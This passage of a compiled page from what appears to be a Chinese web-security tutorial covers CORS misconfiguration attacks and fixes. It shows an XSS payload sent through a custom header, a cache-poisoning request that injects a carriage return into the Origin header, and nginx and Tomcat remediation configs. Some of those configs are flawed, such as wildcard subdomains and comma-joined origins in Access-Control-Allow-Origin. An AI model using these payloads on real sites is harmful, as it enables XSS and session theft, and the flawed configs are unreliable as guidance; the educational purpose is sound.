header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://attacker.domain/ </span></span>\n… \n<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html </span></span>\n… \nInvalid user: &lt;svg/onload=alert(1)&gt;\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>构造存在恶意的 XSS 有效负载页面，诱使受害者触发。</li></ol><div class="language-JavaScript line-numbers-mode" data-ext="JavaScript" data-title="JavaScript"><pre class="language-JavaScript"><code>var req = new XMLHttpRequest(); \nreq.onload = reqListener; req.open(&#39;get&#39;,&#39;http://www.target.local/login&#39;,true); \nreq.setRequestHeader(&#39;X-User&#39;, &#39;&lt;svg/onload=alert(1)&gt;&#39;);\nreq.send(); \nfunction reqListener() { \n    location=&#39;http://www.target.local/login&#39;; \n}\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="服务器端缓存中毒" tabindex="-1"><a class="header-anchor" href="#服务器端缓存中毒"><span>服务器端缓存中毒</span></a></h2><ul><li><p>利用 CORS 的错误配置注入任意 HTTP 头部，将其保存在服务器端缓存中，可用于构造存储类型 XSS。</p></li><li><p>利用条件：存在服务器端缓存，能够反射 <code>Origin</code> 头部，不会检查 <code>Origin</code> 头部中的特殊字符，如 <code>\\r</code></p></li><li><p>利用方式：攻击 <code>IE / Edge</code> 用户（<code>IE / Edge</code> 使用 <code>\\r</code> 作为的 HTTP 标题段的终结符）</p></li></ul><ol><li>请求包</li></ol><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span> \n<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">z[0x0d]Content-Type: text/html; charset=UTF-7</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>回车（CR）：ASCII 码：<code>&#39;\\r&#39;</code> ，十六进制：<code>0x0d</code></p><ol start="2"><li>响应包</li></ol><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK </span></span>\n<span class="token header"><span class="token header-name keyword">Access-Control-Allow-Origin</span><span class="token punctuation">:</span> <span class="token header-value">z </span></span>\n<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-7</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果攻击者能提前发送畸形的 <code>Origin</code> 消息头，则利用代理或命令行的方式发送，则服务器就会缓存这样的返回报文并作用于其他用户。上例中，攻击者将页面的编码设置为 <code>UTF-7</code>，可引发 XSS 中断。</p><h2 id="配合-xss-劫持会话" tabindex="-1"><a class="header-anchor" href="#配合-xss-劫持会话"><span>配合 XSS 劫持会话</span></a></h2><p>在正常的网页被嵌入了到攻击者控制页面的跨域请求，从而劫持用户的会话。</p><ol><li><p>交互式 xss。通过 cors，绕过一些反会话劫持的方法，如 HTTP-Only 限制的 cookie，绑定 IP 地址的会话 ID 等，劫持用户会话。</p></li><li><p>程序猿在写 ajax 请求的时候，对目标域限制不严，有点类似于 url 跳转。</p><p>facebook 出现过这样一个案例，javascript 通过 url 里的参数进行 ajax 请求。 <img src="'+E+'" alt="" loading="lazy">​</p></li></ol><h2 id="cors-与-csrf-的区别" tabindex="-1"><a class="header-anchor" href="#cors-与-csrf-的区别"><span>CORS 与 CSRF 的区别</span></a></h2><p>CORS 机制的目的是为了解决脚本的跨域资源请求问题，不是为了防止 CSRF。</p><p>CSRF 一般使用 form 表单提交请求，而浏览器是不会对 form 表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。</p><p>脚本的跨域请求在同源策略的限制下，响应会被拦截，即阻止获取响应，但是<strong>请求还是发送到了后端服务器</strong>。</p><p><strong>相同点</strong>：都需要第三方网站；都需要借助 Ajax 的异步加载过程；一般都需要用户登录目标站点。</p><p><strong>不同点</strong>：一般 CORS 漏洞用于读取受害者的敏感信息，获取请求响应的内容；而 CSRF 则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。</p><h1 id="_0x06-修复方法" tabindex="-1"><a class="header-anchor" href="#_0x06-修复方法"><span>0x06 修复方法</span></a></h1><p>修复方法是合理配置 CORS，判断 Origin 是否合法；具体说就是不让在 nginx 或 tomcat 中配置【Access-Control-Allow-Origin <code>*</code>​​​​​】或【Access-Control-Allow-Origin null​​​​​】。</p><ul><li>关闭非正式开启的 CORS，不要信任全部自身子域，减少攻击面</li><li>不要配置 Access-Control-Allow-Origin​​​ 为通配符 <code>*</code>​​​ 或 null​​​，严格校验来自请求数据包中 Origin​​​ 的值</li><li>彻底的返回 <code>Vary: Origin</code>​​​ 右边，突破攻击者利用浏览器缓存进行攻击</li><li>仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性</li><li>HTTPS 网站不要信任 HTTP 域</li></ul><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code># 允许跨域请求的域，* 代表所有；null 可以用来和本地 file 页面共享数据\nadd_header &#39;Access-Control-Allow-Origin&#39; *;\n\n# 允许请求的 header\nadd_header &#39;Access-Control-Allow-Headers&#39; *;\n\n# 允许带上 cookie 请求，不能和允许跨域请求的域 * 一同使用，Origin 需要明确的配置允许来源的域。因为 * 这种配置只能用于共享公开资源，对于共享公开资源，不应该需要身份认证。\nadd_header &#39;Access-Control-Allow-Credentials&#39; &#39;true&#39;;\n\n# 允许请求的方法，比如 GET,POST,PUT,DELETE\nadd_header &#39;Access-Control-Allow-Methods&#39; *;\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>修改 Nginx 配置文件</strong></p><h2 id="方法一-使用通配符-​​" tabindex="-1"><a class="header-anchor" href="#方法一-使用通配符-​​"><span>方法一：使用通配符 <code>*</code>​​</span></a></h2><div class="language-nginx line-numbers-mode" data-ext="nginx" data-title="nginx"><pre class="language-nginx"><code><span class="token directive"><span class="token keyword">location</span> /</span> <span class="token punctuation">{</span>\n    <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Origin *.xxx.com</span><span class="token punctuation">;</span>\n    <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Headers <span class="token string">&quot;Origin， X-Requested-With, Content-Type, Accept&quot;</span></span><span class="token punctuation">;</span>\n    <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Methods <span class="token string">&quot;GET, POST, OPTIONS&quot;</span></span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="方法二-指定域名白名单" tabindex="-1"><a class="header-anchor" href="#方法二-指定域名白名单"><span>方法二：指定域名白名单</span></a></h2><p>根据错误配置类型，该方法有待确认。</p><div class="language-nginx line-numbers-mode" data-ext="nginx" data-title="nginx"><pre class="language-nginx"><code><span class="token comment"># 使用域名</span>\n<span class="token directive"><span class="token keyword">location</span> /</span> <span class="token punctuation">{</span>\n    <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Origin http://www.xixixi123.com</span><span class="token punctuation">;</span>\n    <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Headers <span class="token string">&quot;Origin， X-Requested-With, Content-Type, Accept&quot;</span></span><span class="token punctuation">;</span>\n    <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Methods <span class="token string">&quot;GET, POST, OPTIONS&quot;</span></span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n\n<span class="token comment"># 指定 ip 与端口，可以逗号拼接</span>\n<span class="token directive"><span class="token keyword">location</span> /</span> <span class="token punctuation">{</span>\n    <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Origin http://10.130.222.222:6500,http://10.130.222.223:6500</span><span class="token punctuation">;</span>\n    <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Headers <span class="token string">&quot;Origin， X-Requested-With, Content-Type, Accept&quot;</span></span><span class="token punctuation">;</span>\n    <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Methods <span class="token string">&quot;GET, POST, OPTIONS&quot;</span></span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="方法三-使用正则表达式" tabindex="-1"><a class="header-anchor" href="#方法三-使用正则表达式"><span>方法三：使用正则表达式</span></a></h2><div class="language-nginx line-numbers-mode" data-ext="nginx" data-title="nginx"><pre class="language-nginx"><code><span class="token directive"><span class="token keyword">location</span> ~ /myurl(.*)</span> <span class="token punctuation">{</span>\n    <span class="token directive"><span class="token keyword">if</span> ( <span class="token variable">$http_origin</span> ~ <span class="token string">&#39;^http(s)?://(localhost|10\\.130\\.222\\.222):6500$&#39;</span></span> <span class="token punctuation">{</span>\n        <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Origin <span class="token variable">$http_origin</span></span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n    <span class="token directive"><span class="token keyword">if</span> ( <span class="token variable">$http_origin</span> ~ <span class="token string">&#39;^http(s)?://(localhost|10\\.130\\.222\\.223):6500$&#39;</span></span> <span class="token punctuation">{</span>\n        <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Origin <span class="token variable">$http_origin</span></span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Headers <span class="token string">&quot;Origin， X-Requested-With, Content-Type, Accept&quot;</span></span><span class="token punctuation">;</span>\n    <span class="token directive"><span class="token keyword">add_header</span> Access-Control-Allow-Methods <span class="token string">&quot;GET, POST, OPTIONS&quot;</span></span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>说明</strong></p>',42),bn=(0,e.Fv)("<li><code>​$ http_origin</code>​​ 可以获取到请求头中的 Origin 字段；但是如果请求头没有，就获取不到了；</li><li><code>​^</code>​​ 是正则表达式，表示开头位置；$​​ 是正则表达式，表示结尾位置</li><li>​<code>?</code>​​ 是正则表达式，表示 s 可能有，也可能没有，这两种情况都可以匹配</li><li><code>.</code>​​​ 是把 <code>.</code>​​ 转义成普通字符的意思</li><li>nginx 中，if 后必须加空格，然后才能写 (​​，否则会报错；nginx 中，没有 else if</li>",5),wn=(0,e.Lk)("code",null,"add_header 'Access-Control-Allow-Origin' \"$http_origin\" always;​​ ",-1),fn={href:"https://gist.github.com/Stanback/7145487",target:"_blank",rel:"noopener noreferrer"},xn=(0,e.Fv)('<p><strong>白名单配置示例</strong></p><figure><img src="'+y+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><strong>Tomcat 过滤路由</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">filter</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">UnsupportedEncodingException</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">MessageDigest</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">NoSuchAlgorithmException</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">Filter</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterChain</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterConfig</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequest</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletResponse</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebFilter</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>ws<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HTTPException</span></span><span class="token punctuation">;</span>\n\n<span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span><span class="token string">&quot;/Cors&quot;</span><span class="token punctuation">)</span>\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CorsFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>\n\n    <span class="token doc-comment comment">/**\n     * Default constructor.\n     */</span>\n    <span class="token keyword">public</span> <span class="token class-name">FilterConfig</span> config<span class="token punctuation">;</span>\n\n    <span class="token keyword">public</span> <span class="token class-name">CorsFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token comment">// TODO Auto-generated constructor stub</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token doc-comment comment">/**\n     * <span class="token keyword">@see</span> <span class="token reference"><span class="token class-name">Filter</span><span class="token punctuation">#</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>\n     */</span>\n    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token comment">// TODO Auto-generated method stub</span>\n        <span class="token keyword">this</span><span class="token punctuation">.</span>config <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token doc-comment comment">/**\n     * <span class="token keyword">@see</span> <span class="token reference"><span class="token class-name">Filter</span><span class="token punctuation">#</span><span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span><span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span><span class="token punctuation">,</span> <span class="token class-name">FilterChain</span><span class="token punctuation">)</span></span>\n     */</span>\n    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>\n        <span class="token comment">//配置可信域名</span>\n        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> authhosts <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;http://www.abc.com:8008&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://www.abcyy.com&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> authost <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>\n        <span class="token class-name">HttpServletRequest</span> httprequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> request<span class="token punctuation">;</span>\n        <span class="token class-name">String</span> origin <span class="token operator">=</span> httprequest<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">&quot;origin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">HttpServletResponse</span> httpresponse <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span> response<span class="token punctuation">;</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>origin <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>authhosts<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>origin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            httpresponse<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">return</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>\n            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> authhosts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> authhosts<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                    authost <span class="token operator">=</span> authost <span class="token operator">+</span> authhosts<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">&quot;,&quot;</span><span class="token punctuation">;</span>\n                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>\n                    authost <span class="token operator">=</span> authost <span class="token operator">+</span> authhosts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>\n                <span class="token punctuation">}</span>\n            <span class="token punctuation">}</span>\n            httpresponse<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Access-Control-Allow-Origin&quot;</span><span class="token punctuation">,</span> authost<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            httpresponse<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Access-Control-Allow-Methods&quot;</span><span class="token punctuation">,</span>\n                    <span class="token string">&quot;GET, POST&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            httpresponse<span class="token punctuation">.</span><span class="token function">addHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Access-Control-Allow-Headers&quot;</span><span class="token punctuation">,</span>\n                    <span class="token string">&quot;origin, content-type, accept, x-requested-with, sid, mycustom, smuser&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n    <span class="token punctuation">}</span>\n\n\n    <span class="token annotation punctuation">@Override</span>\n    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> arg0<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>\n        <span class="token comment">// TODO 自动生成的方法存根</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>另一种配置方式</strong></p><ul><li>把 cors-filter-1.7.jar 与 java-property-utils-1.9.jar 这两个文件放到 tomcat 的 lib 目录下</li><li>在 tomcat 的 web.xml 中配置</li></ul><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">&gt;</span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">&gt;</span></span>CORS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">&gt;</span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">&gt;</span></span>com.thetransactioncompany.cors.CORSFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">&gt;</span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>cors.allowOrigin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>\n    <span class="token comment">&lt;!-- &lt;param-value&gt;*&lt;/param-value&gt; --&gt;</span>\n    <span class="token comment">&lt;!-- 允许访问的网站，多个时用逗号分隔，*代表允许所有 --&gt;</span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>*.xxx.com,http://10.130.222.222:6500<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span> \n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>cors.exposedHeaders<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>Set-Cookie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span> \n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>cors.supportsCredentials<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span> \n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">&gt;</span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">&gt;</span></span>CORS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">&gt;</span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>urlpattern</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="_0x07-优秀案例" tabindex="-1"><a class="header-anchor" href="#_0x07-优秀案例"><span>0x07 优秀案例</span></a></h1>',8),An={href:"https://xz.aliyun.com/t/3514",target:"_blank",rel:"noopener noreferrer"},Cn={href:"https://www.someattack.com/Playground/About",target:"_blank",rel:"noopener noreferrer"},En={href:"https://www.freebuf.com/articles/web/164069.html",target:"_blank",rel:"noopener noreferrer"},yn=(0,e.Lk)("h1",{id:"_0x00-前人栽树",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#_0x00-前人栽树"},[(0,e.Lk)("span",null,"0x00 前人栽树")])],-1),qn={href:"https://www.ruanyifeng.com/blog/2016/04/cors.html",target:"_blank",rel:"noopener noreferrer"},On={href:"https://www.jianjunchen.com/post/cors%E5%AE%89%E5%85%A8%E9%83%A8%E7%BD%B2%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#contact",target:"_blank",rel:"noopener noreferrer"},Sn={href:"https://web.dev/cross-origin-resource-sharing/",target:"_blank",rel:"noopener noreferrer"},Rn={href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS",target:"_blank",rel:"noopener noreferrer"},Tn={href:"https://nvd.nist.gov/vuln/detail/CVE-2018-8014",target:"_blank",rel:"noopener noreferrer"},Bn={href:"https://segmentfault.com/a/1190000011145364",target:"_blank",rel:"noopener 